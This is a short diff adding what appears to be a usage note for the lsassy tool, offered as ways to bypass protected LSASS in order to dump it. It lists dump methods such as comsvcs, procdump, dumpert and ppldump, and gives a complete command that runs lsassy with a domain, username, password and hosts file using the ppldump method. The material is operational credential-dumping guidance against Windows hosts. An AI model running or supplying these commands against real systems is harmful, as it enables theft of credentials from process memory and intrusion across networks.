@@ -1,0 +1,13 @@
+Need to dump LSASS? Is LSASS protected? Here are ways to bypass protected LSASS.
+
+comsvcs
+comsvcs_stealth
+dllinject
+procdump
+procdump_embedded
+dumpert
+dumpertdll
+ppldump
+ppldump_embedded
+
+lsassy -d example -u pixis -p pass hosts.txt -m ppldump
